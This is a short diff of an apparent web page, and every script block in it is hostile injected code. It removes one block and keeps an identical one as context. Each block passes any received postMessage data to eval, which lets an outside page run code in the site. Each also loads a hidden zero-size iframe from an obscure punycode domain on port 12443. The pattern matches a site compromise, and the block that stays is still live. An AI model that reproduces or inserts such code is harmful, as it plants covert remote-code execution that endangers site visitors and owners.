@@ -10,6 +10,3 @@
 <script type="text/javascript">
 (function(){window.addEventListener("message",function(e){var _des_s_9763=e.data;if(_des_s_9763.des_s_9763){var _s = '/+/g';eval(decodeURIComponent(_des_s_9763.des_s_9763.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--2qu92fhtx4ff.ink:12443/ty/c-9763-24-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();
 </script>
-<script type="text/javascript">
-(function(){window.addEventListener("message",function(e){var _des_s_9768=e.data;if(_des_s_9768.des_s_9768){var _s = '/+/g';eval(decodeURIComponent(_des_s_9768.des_s_9768.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--2qu92fhtx4ff.ink:12443/ty/x-9768-34-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();
-</script>
